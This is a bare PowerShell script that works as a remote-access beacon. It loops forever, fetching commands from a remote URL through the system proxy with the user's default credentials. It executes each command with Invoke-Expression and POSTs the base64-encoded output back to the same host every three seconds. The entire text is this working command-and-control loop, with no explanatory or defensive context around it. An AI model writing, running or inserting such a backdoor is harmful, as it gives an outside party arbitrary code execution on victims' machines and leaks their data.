while($true)
{

$proxyurl = ([System.Net.WebRequest]::GetSystemWebproxy()).GetProxy($dest)
$command = (Invoke-WebRequest $dest -Proxy $proxyurl -ProxyUseDefaultCredentials).Content
if (-not ([string]::IsNullOrEmpty($command)))
{
$output = iex $command | Out-String
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($output)
$EncodedText = [Convert]::ToBase64String($Bytes)
Invoke-WebRequest -Uri $dest -Proxy $proxyurl -ProxyUseDefaultCredentials -Method POST -Body $EncodedText
}
Start-Sleep -s 3
}